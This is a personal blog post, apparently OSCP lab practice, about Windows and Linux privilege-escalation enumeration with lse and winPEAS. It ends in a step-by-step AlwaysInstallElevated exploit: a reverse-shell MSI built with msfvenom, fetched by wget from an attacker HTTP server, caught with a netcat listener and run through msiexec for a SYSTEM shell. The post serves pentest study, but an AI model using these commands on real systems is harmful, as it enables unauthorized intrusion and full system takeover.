---
layout: post
title: Windows and Linux Privilege Escalation Tools
subtitle: Abusing the AlwaysInstallElevated option for privilege escalation
tags: [Security, OSCP, Privilege escalation, Pentest, Red-teaming]
comments: true
---

In my preperation for the OSCP course i am learning about both linux and windows privilege escalations techniques.
There are differten escaltion techniques like escalation via kernel exploits, unqoted services, misconfigruations and stuff like that.
I built myself a lab to practice on. 
I have used <https://github.com/sagishahar/lpeworkshop> for the lab. Everything you need to know is in there. I did use a Win 10 machine so i had to remove the space between the md5 hashes to make the script work. Also i did create an admin account and disabled the realtime protection.

You can find the different privilege escalation manually or via automated scripts.
The two tools i use for automation are linux-smart-enumeration for Linux <https://github.com/diego-treitos/linux-smart-enumeration> and
winPEAS for Windows <https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite>

To use lse (Linux-smart-enumeration), first we nee to download the script. 
<div class="alert-info">git clone git clone https://github.com/diego-treitos/linux-smart-enumeration.git
</div>

Next we can use lse. you can use the -h parameter to show the options. I am not going to get in details about this.
<div class="alert-info">./lse.sh -h
</div>
Of course you have to run this on the victim-pc or victim-server.

To use winPEAS ,first we need to download the scripts.
<div class="alert-info">git clone git clone https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite.git
</div>
As with the lse.sh script, you have to run this on the victim-pc or victim-server.

To transfer one of these files you have a few options you can use.
On linux you can start a http server to download the files via the shell on the victim.
Other options are to transfer these files via SMB or NetCat if it is available on the victim.
When transfering via SMB you have to setup SMB on kali.

To start a http server run the following command.
<div class="alert-info">sudo python3 -m http.server 80</div>
This will start a http on port 80 in the directory you currently are.

You can now download the lse.sh if you are on Linux or winPEAS.exe if you are on Windows.
Once you have transferd one of the files you can run it and read the output carefully for anything interesting that could lead to a privilege escalation.

Let's say we already have shell on a Windows victim we could start from there to download the winPEAS.exe file.
<div class="alert-info">wget http://ip/winPEAS.exe -O winPEAS.exe</div>
![image](/assets/img/transfer-winpeas.png)
As you can see the shell we had does not understand weget. So we just type in powershell to get a powershell shell were we can run the wget comman.

Next run the winPEAS.exe and check for anything interesting that could lead to a privilege escalation.

We use the command .\winPEAS.exe -h to see what options we have.
![image](/assets/img/winpeas-h.png)
Let's run the following command
<div class="alert-info">.\winPEAS.exe windowscreds</div>
![image](/assets/img/winpeas-windowscreds.png)
The results shows us that AlwaysInstallElevated is set to 1 in both HKLM and HKCU!
This means that .MSI packages are installed with eleveated system privileges.

We now can run the following msfvenom commannd to create a payload with a reverse shell in it.
<div class="alert-info">msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f msi -o reverse.msi</div>
![image](/assets/img/msfvenom-msi.png)
Next we set up a http server to download the file from the victim
<div class="alert-info">sudo python3 -m http.server 80</div>
![image](/assets/img/http-server.png)

Next we download the reverse.msi to the victim
<div class="alert-info">wget http://ip/reverse.msi -O reverse.msi</div>
![image](/assets/img/wget-msi.png)

We now setup a new NetCat listener on Kali 
<div class="alert-info">sudo nc -nlvp 55</div>
![image](/assets/img/nc-listener-55.png)

Finally we run the following command in the victim shell
<div class="alert-info">msiexec /quiet /qn /i reverse.msi</div>
![image](/assets/img/msiexec.png)

Lets go back to the new nc listener and checkout if we did catch the reverse shell with system privileges.

![image](/assets/img/system-msiexec.png)

Yes, we have shell and running it as system!
